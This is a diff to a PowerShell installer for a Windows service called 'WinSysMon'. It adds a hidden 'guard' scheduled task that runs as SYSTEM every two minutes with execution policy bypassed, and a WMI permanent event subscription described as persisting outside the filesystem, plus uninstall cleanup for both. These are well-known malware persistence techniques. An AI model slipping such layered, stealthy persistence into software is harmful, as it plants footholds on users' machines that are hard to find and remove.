@@ -53,8 +53,15 @@ if ($Uninstall) {
     try { Stop-Service $serviceName -Force -ErrorAction SilentlyContinue } catch {}
     & sc.exe delete $serviceName | Out-Null
     try { Unregister-ScheduledTask -TaskName "WinSysMonWatchdog" -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+    try { Unregister-ScheduledTask -TaskName "WinSysMonGuard"    -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+    try {
+        $ns = "root\subscription"
+        Get-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter.Name -eq "WinSysMonFilter" } | Remove-CimInstance -ErrorAction SilentlyContinue
+        Get-CimInstance -Namespace $ns -ClassName __EventFilter -Filter "Name='WinSysMonFilter'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
+        Get-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Filter "Name='WinSysMonConsumer'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
+    } catch {}
     Start-Sleep 1
-    Write-InstallLog "Servico e watchdog removidos" "OK"
+    Write-InstallLog "Servico, watchdog, guard e WMI removidos" "OK"
     exit 0
 }
 
@@ -366,6 +373,35 @@ try {
     Register-ScheduledTask -TaskName $wdTask -Action $action -Trigger @($trigger1,$trigger2) -Principal $principal -Settings $settings -Force | Out-Null
     Write-InstallLog "Watchdog task '$wdTask' registrada (AtStartup + 1 min)" "OK"
 } catch { Write-InstallLog "Watchdog task falhou: $($_.Exception.Message)" "WARN" }
+
+# ---- Guard task: segunda task com nome/trigger diferente ----
+try {
+    $gdTask = "WinSysMonGuard"
+    try { Unregister-ScheduledTask -TaskName $gdTask -Confirm:$false -ErrorAction SilentlyContinue } catch {}
+    $actionG   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
+    $trgG1     = New-ScheduledTaskTrigger -AtLogOn
+    $trgG2     = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(2) -RepetitionInterval (New-TimeSpan -Minutes 2) -RepetitionDuration ([TimeSpan]::FromDays(3650))
+    $prinG     = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+    $setG      = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew -ExecutionTimeLimit (New-TimeSpan -Minutes 10)
+    Register-ScheduledTask -TaskName $gdTask -Action $actionG -Trigger @($trgG1,$trgG2) -Principal $prinG -Settings $setG -Force | Out-Null
+    Write-InstallLog "Guard task '$gdTask' registrada (AtLogOn + 2 min)" "OK"
+} catch { Write-InstallLog "Guard task falhou: $($_.Exception.Message)" "WARN" }
+
+# ---- WMI Permanent Event Subscription (persiste fora do filesystem) ----
+try {
+    $ns = "root\subscription"
+    $fname = "WinSysMonFilter"; $cname = "WinSysMonConsumer"
+    $query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 5"
+    $cmdLine = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"$wdCmd`""
+    # Cleanup antigo
+    Get-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object { $_.Filter.Name -eq $fname } | Remove-CimInstance -ErrorAction SilentlyContinue
+    Get-CimInstance -Namespace $ns -ClassName __EventFilter -Filter "Name='$fname'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
+    Get-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Filter "Name='$cname'" -ErrorAction SilentlyContinue | Remove-CimInstance -ErrorAction SilentlyContinue
+    $flt = New-CimInstance -Namespace $ns -ClassName __EventFilter -Property @{Name=$fname;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$query} -ErrorAction Stop
+    $cns = New-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer -Property @{Name=$cname;CommandLineTemplate=$cmdLine;RunInteractively=$false} -ErrorAction Stop
+    New-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding -Property @{Filter=[ref]$flt;Consumer=[ref]$cns} -ErrorAction Stop | Out-Null
+    Write-InstallLog "WMI persistence registrada ($fname + $cname)" "OK"
+} catch { Write-InstallLog "WMI persistence falhou: $($_.Exception.Message)" "WARN" }
 
 # ---- Iniciar servico com retry ----
 Write-InstallLog "Iniciando servico..."
